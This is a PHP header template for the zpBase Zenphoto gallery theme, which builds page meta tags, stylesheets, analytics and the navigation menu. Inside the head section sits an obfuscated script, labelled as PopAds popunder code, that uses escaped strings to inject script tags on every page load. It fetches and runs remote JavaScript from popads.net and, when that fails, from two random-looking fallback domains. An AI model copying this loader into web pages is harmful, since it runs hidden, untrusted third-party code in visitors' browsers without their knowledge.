<?php 
/*	zpBase Header include
* 	This file is included at the beginning of every page.
*	Sets up some variables depending on context and writes the necessary html at the beginning of every page.
* 	It also includeds the html for the top menu.
*	http://www.oswebcreations.com	
================================================== */
// force UTF-8 Ø

if (!defined('WEBPATH')) die();?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="<?php echo LOCAL_CHARSET; ?>" />
	<?php zp_apply_filter('theme_head');
	$zpbase_metadesc = truncate_string(getBareGalleryDesc(),150,'...');	
	// Set some things depending on what page we are on...
	switch ($_zp_gallery_page) {
		case 'index.php':
			if (getOption('zpbase_galleryishome')) $galleryactive = true;
			$objectclass = 'gallery-index';
			$rss_option = 'Gallery'; $rss_title = gettext('RSS Gallery Images');
			break;
		case 'gallery.php':
			$galleryactive = true;
			$objectclass = 'gallery-sep-index';
			$rss_option = 'Gallery'; $rss_title = gettext('RSS Gallery Images');
			break;
		case 'album.php':
			$zpbase_metadesc = truncate_string(getBareAlbumDesc(),150,'...');
			$galleryactive = true;
			$objectclass = str_replace (" ", "", getBareAlbumTitle()).'-'.$_zp_current_album->getID();
			$rss_option = 'Collection'; $rss_title = gettext('RSS Album Images');
			break;
		case 'image.php':
			$zpbase_metadesc = truncate_string(getBareImageDesc(),150,'...');
			$galleryactive = true;
			$objectclass = str_replace (" ", "", getBareImageTitle()).'-'.$_zp_current_image->getID();
			break;
		case 'archive.php':
			$zpbase_metadesc = gettext('Archive View').'... '.truncate_string(getBareGalleryDesc(),130,'...');	
			$objectclass = 'archive-page';			
			$rss_option = 'Gallery'; $rss_title = gettext('RSS Gallery Images');
			break;
		case 'search.php':	
			$objectclass = 'search-results';
			break;
		case 'pages.php':
			$zpbase_metadesc = strip_tags(truncate_string(getPageContent(),150,'...'));
			$objectclass = str_replace (" ", "", getBarePageTitle()).'-'.$_zp_current_zenpage_page->getID();
			$rss_option = 'Pages'; $rss_title = gettext('RSS Pages');
			break;
		case 'news.php':
			$rss_option = 'News'; $rss_title = gettext('RSS News');
			if (is_NewsArticle()) {
			$zpbase_metadesc = strip_tags(truncate_string(getNewsContent(),150,'...'));
			$objectclass = str_replace (" ", "", getBareNewsTitle()).'-'.$_zp_current_zenpage_news->getID();
			} else if ($_zp_current_category) {
			$zpbase_metadesc = strip_tags(truncate_string(getNewsCategoryDesc(),150,'...'));
			$objectclass = str_replace (" ", "", html_encode($_zp_current_category->getTitle())).'-news';
			$rss_option = 'Category'; $rss_title = gettext('RSS News Category');
			} else if (getCurrentNewsArchive()) {
			$zpbase_metadesc = getCurrentNewsArchive().' '.gettext('News Archive').'... '.truncate_string(getBareGalleryDesc(),130,'...');	
			$objectclass = str_replace (" ", "", getCurrentNewsArchive()).'-news';
			} else {
			$zpbase_metadesc = gettext('News').'... '.truncate_string(getBareGalleryDesc(),130,'...');	
			$objectclass = 'news-index';
			}
			break;
		case 'contact.php':
			$zpbase_metadesc = gettext('Contact').'... '.truncate_string(getBareGalleryDesc(),130,'...');	
			$objectclass = 'contact-page';	
			break;
		case 'login.php':
			$zpbase_metadesc = gettext('Login').'... '.truncate_string(getBareGalleryDesc(),130,'...');
			$objectclass = 'login-page';	
			break;
		case 'register.php':
			$zpbase_metadesc = gettext('Register').'... '.truncate_string(getBareGalleryDesc(),130,'...');
			$objectclass = 'register-page';	
			break;
		case 'password.php':
			$zpbase_metadesc = gettext('Enter Password').'... '.truncate_string(getBareGalleryDesc(),130,'...');
			$objectclass = 'password-page';	
			break;
		case '404.php':
			$zpbase_metadesc = gettext('404 Not Found').'... '.truncate_string(getBareGalleryDesc(),130,'...');
			$objectclass = 'notfound-page';	
			break;
		case 'favorites.php':
			$zpbase_metadesc = gettext('Favorites').'... '.truncate_string(getBareGalleryDesc(),130,'...');
			$objectclass = 'favorites-page';	
			break;
		default:
			$zpbase_metadesc = truncate_string(getBareGalleryDesc(),150,'...');
			$objectclass = null;
			break;
	} 
	// Print the defined RSS header links, title, and description
	if ((class_exists('RSS')) && ($rss_option != null)) printRSSHeaderLink($rss_option,$rss_title); ?>
	<?php printHeadTitle(); ?>
	<meta name="description" content="<?php echo $zpbase_metadesc; ?>" />	
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<link rel="stylesheet" href="<?php echo $_zp_themeroot; ?>/css/style.css">

	<script>
	// Mobile Menu
	$(function() {
		var navicon = $('#nav-icon');
		menu = $('#nav');
		menuHeight	= menu.height();
		$(navicon).on('click', function(e) {
			e.preventDefault();
			menu.slideToggle();
			$(this).toggleClass('menu-open');
		});
		$(window).resize(function(){
        	var w = $(window).width();
        	if(w > 320 && menu.is(':hidden')) {
        		menu.removeAttr('style');
        	}
    	});
	});
	</script>
	
	<?php if (getOption('zpbase_selectmenu') == 'chosen') { ?>
	<link rel="stylesheet" href="<?php echo $_zp_themeroot; ?>/css/chosen.css">
	<script src="<?php echo $_zp_themeroot; ?>/js/chosen.jquery.js"></script>
	<script>
	$(document).ready(function(){
		$(".jump select").chosen({
			disable_search_threshold: 15,
			search_contains: true
		}).change(function(e){
			window.location = $(this).val();
		});
	});
	</script>
	<!-- fix to drop UP -->
	<style>
	.chosen-container .chosen-drop {
		top:auto !important;
		bottom:29px;
		border:solid #aaa;
		border-width:1px 1px 0 1px;
	}
	</style>
	<?php } ?>
	
	<script src="<?php echo $_zp_themeroot; ?>/js/magnific-popup.js"></script>
	<script src="<?php echo $_zp_themeroot; ?>/js/zpbase_js.js"></script>
	
	<link rel="shortcut icon" href="<?php echo $_zp_themeroot; ?>/images/favicon.ico">
	<link rel="apple-touch-icon-precomposed" href="<?php echo $_zp_themeroot; ?>/favicon-152.png">
	<meta name="msapplication-TileColor" content="#ffffff">
	<meta name="msapplication-TileImage" content="<?php echo $_zp_themeroot; ?>/favicon-144.png">
	
	<?php if (getOption('zpbase_googlefont1') != null) { 
	$googlefontstack1 = str_replace('+',' ',getOption('zpbase_googlefont1')); ?>
	<link href="http://fonts.googleapis.com/css?family=<?php echo getOption('zpbase_googlefont1'); ?>" rel="stylesheet" type="text/css" />
	<?php } ?>
	<?php if (getOption('zpbase_googlefont2') != null) {
	$googlefontstack2 = str_replace('+',' ',getOption('zpbase_googlefont2')); ?>
	<link href="http://fonts.googleapis.com/css?family=<?php echo getOption('zpbase_googlefont2'); ?>" rel="stylesheet" type="text/css" />
	<?php } ?>
	<style>
		<?php if (is_numeric(getOption('zpbase_maxwidth'))) { echo '.row{max-width:'.getOption('zpbase_maxwidth').'px;}'; } else { echo '.row{max-width:900px;}'; } ?>
		<?php if (getOption('zpbase_bg') != null) { 
		$bg = pathurlencode(WEBPATH.'/'.UPLOAD_FOLDER.'/'.getOption('zpbase_bg'));
		echo 'body{background-image: url('.$bg.');}';
		} ?>
		<?php if (getOption('zpbase_align') == 'left') { ?>
		#object-info,#object-menu,#object-desc,#header,#footer,#footer-menu,.block.searchwrap h1,.block.archive h3,.searchresults {text-align:left;}
		#search,#imagemetadata table{margin-left:0;margin-right:0;}
		<?php } ?>
		<?php if (getOption('zpbase_googlefont1') != null) { ?>body,#nav a,#sidebar ul a{font-family: '<?php echo $googlefontstack1; ?>', sans-serif;} <?php } ?>
		<?php if (getOption('zpbase_googlefont2') != null) { ?>h1,h2,h3,h4,h5,h6{font-family: '<?php echo $googlefontstack2; ?>', serif;} <?php } ?>
		<?php if (((getOption('zpbase_fontsize')) > 10) && (getOption('zpbase_fontsize') < 19)) echo 'body{font-size:'.getOption('zpbase_fontsize').'px;}'; ?>
		<?php if (getOption('zpbase_customcss') != null) { echo getOption('zpbase_customcss'); } ?>
		<?php if (($isMobile) || ($isTablet)) { echo 'body{font-size:16px;}'; } ?>
	</style>

<!-- PopAds.net Popunder Code for oula.hol.es | 2017-03-12,1844066,0,0 -->
<script type="text/javascript" data-cfasync="false">
/*<![CDATA[/* */
 (function(){ var g=window;g["\u005fp\x6f\x70"]=[["\u0073i\u0074e\u0049d",1844066],["m\u0069\x6e\x42\x69d",0],["\u0070\u006f\u0070\u0075\u006ed\x65\u0072\u0073Pe\u0072I\u0050",0],["\u0064\x65\x6c\u0061y\x42\x65\x74\x77\u0065\x65n",0],["\x64\x65\u0066\x61\u0075l\x74",false],["\x64\u0065fa\u0075\u006c\u0074\x50e\x72\x44\u0061y",0],["\x74\u006fpm\u006f\u0073\u0074\x4cay\u0065\u0072",!0]];var q=["/\u002fc\u0031.\x70\x6fpa\x64s\u002e\x6e\u0065\u0074\x2fp\u006fp\x2e\u006a\x73","//\x63\x32\x2e\u0070\u006fpads.n\u0065\u0074\u002fp\x6fp\u002e\u006as","\u002f\x2fw\x77\x77.l\x6d\x6aj\u0065\u006e\x68\u0064ub\u0070\x75.\u0063o\x6d\x2f\u006b\u007a\x2ejs","\x2f\x2fww\x77\u002e\x76\u0068a\x74\x70bm\x69\u0074\x77\x63n.\x63o\u006d\u002f\x78r.\u006a\x73",""],f=0,i,x=function(){if(""==q[f])return;i=g["do\u0063u\x6de\u006et"]["\u0063\u0072e\u0061\u0074\u0065E\x6ce\x6de\u006et"]("\x73\u0063\u0072\u0069\u0070t");i["\u0074y\u0070e"]="t\u0065\x78\x74\u002f\u006a\x61v\u0061\x73\u0063\u0072ip\x74";i["as\u0079n\u0063"]=!0;var c=g["d\u006fc\u0075\x6d\x65nt"]["\u0067\x65\u0074El\x65\x6dent\x73\x42\u0079\x54\x61\u0067Na\x6d\u0065"]("\x73\x63\u0072\x69\x70\x74")[0];i["s\u0072c"]=q[f];if(f<2){i["\x63\x72\u006f\x73\x73\u004f\x72\x69\x67i\x6e"]="ano\u006e\u0079\u006do\x75s";};i["\u006fner\x72\u006f\x72"]=function(){f++;x()};c["pa\x72\x65\x6et\u004eod\x65"]["i\u006es\x65r\u0074B\x65f\x6f\x72\x65"](i,c)};x()})();
/*]]>/* */
</script>



</head>
<body id="<?php echo getOption('zpbase_style'); ?>" class="<?php echo $objectclass.' '.$layoutbodyclass; ?>">
	<?php if ( (getOption('zpbase_analytics')) && (!zp_loggedin(ADMIN_RIGHTS)) ) { ?>
	<script>
		<?php if (getOption('zpbase_analytics_type') == 'universal') { ?>
		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
		})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
		ga('create', '<?php echo getOption('zpbase_analytics'); ?>', 'auto');
		ga('send', 'pageview');
		<?php } else { ?>
		var _gaq = _gaq || [];
		_gaq.push(['_setAccount', '<?php echo getOption('zpbase_analytics'); ?>']);
		_gaq.push(['_trackPageview']);
		(function() {
			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
		})();
		<?php } ?>
	</script>
	<?php } ?>
	<?php zp_apply_filter('theme_body_open'); ?>
	
	<?php if ( ($noset) && (zp_loggedin(ADMIN_RIGHTS)) ) { ?><div id="noset"><?php echo 'Admin Notice: Since you recently installed zpBase, switched themes or changed the Zenphoto installation, you need to <a style="color:black;text-decoration:underline;" href="'.WEBPATH.'/'.ZENFOLDER.'/admin-options.php?page=options&amp;tab=theme&amp;optiontheme=zpbase">visit the theme options page to set some things →</a>'; ?></div><?php } ?>
	<a href="#" class="scrollup" title="<?php echo gettext('Scroll to top'); ?>"><?php echo gettext('Scroll'); ?></a>
	<div class="container" id="top">
		<div class="row">
			<div id="header">
				<?php if (getOption('zpbase_pnglogo') != '') { ?>
				<a id="logo" href="<?php echo html_encode(getGalleryIndexURL()); ?>"><img class="remove-attributes" src="<?php echo pathurlencode(WEBPATH.'/'.UPLOAD_FOLDER.'/'.getOption('zpbase_pnglogo')); ?>" alt="<?php printGalleryTitle(); ?>" /></a>
				<?php } else { ?>
				<h1><a id="logo" href="<?php echo html_encode(getGalleryIndexURL()); ?>"><?php printGalleryTitle(); ?></a></h1>
				<?php } ?>
				<ul id="nav">
					<?php if (getOption('zpbase_galleryishome')) { ?>
					<li <?php if ($galleryactive) { ?>class="active" <?php } ?>>
						<a href="<?php echo html_encode(getGalleryIndexURL()); ?>" title="<?php echo gettext('Gallery'); ?>"><?php echo gettext('Gallery'); ?></a>
					</li>
					<?php } else { ?>
					<li <?php if ($_zp_gallery_page == "index.php") { ?>class="active" <?php } ?>>
						<a href="<?php echo html_encode(getGalleryIndexURL()); ?>" title="<?php echo gettext('Home'); ?>"><?php echo gettext('Home'); ?></a>
					</li>
					<li <?php if ($galleryactive) { ?>class="active" <?php } ?>>
						<?php printCustomPageURL(gettext('Gallery'),"gallery"); ?>
					</li>
					<?php } ?>
					<?php if ((function_exists('getNewsIndexURL')) && (getOption('zpbase_usenews'))) { ?>
					<?php if (getNumNews(true) > 0) { ?>
					<li <?php if ($_zp_gallery_page == "news.php") { ?>class="active" <?php } ?>>
						<a href="<?php echo getNewsIndexURL(); ?>"><?php echo $newsname; ?></a>
					</li>
					<?php }
					} ?>
					<?php if (function_exists('printPageMenu')) { ?>
					<?php printPageMenu('list','','active open','submenu','active open','',true,false); ?>
					<?php } ?>
					<?php if (getOption('zpbase_archive')) { ?>
					<li <?php if (($_zp_gallery_page == "archive.php") || ($_zp_gallery_page == "search.php")) { ?>class="active" <?php } ?>>
						<a href="<?php echo getCustomPageURL('archive'); ?>" title="<?php echo gettext('Search/Archive'); ?>"><?php echo gettext('Search/Archive'); ?></a>
					</li>
					<?php } ?>
					<?php if (function_exists('printContactForm')) { ?>
					<li <?php if ($_zp_gallery_page == "contact.php") { ?>class="active" <?php } ?>>
						<?php printCustomPageURL(gettext('Contact'),"contact"); ?>
					</li>
					<?php } ?>
				</ul>
				<a href="#" id="nav-icon"><span><?php echo gettext('Menu'); ?></span></a>
			</div>
		</div>
	</div>